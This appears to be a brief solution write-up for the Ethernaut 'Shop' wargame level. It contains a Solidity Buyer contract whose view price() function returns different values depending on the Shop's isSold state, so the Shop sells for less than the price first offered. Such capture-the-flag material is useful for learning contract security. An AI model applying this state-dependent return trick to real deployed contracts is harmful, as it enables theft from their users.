[21 - Shop](https://ethernaut.openzeppelin.com/level/0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842)

Solution: 
* implement a Buyer contract where price() is first bigger, than smaller
* Buyer's price function should be view so can't change state, needs to use isSold from Shop
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {
  bool private returnBig = false;

  Shop private constant shopContract = Shop(0x74F7605391762922f38Db00904A067260418e0BD);

  function price() external view returns (uint) {
    if (!shopContract.isSold()) {
      return 100;
    } else {
      return 99;
    }
  }

  function solve() external {
    shopContract.buy();
  }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
* Remix deploy Buyer and call solve();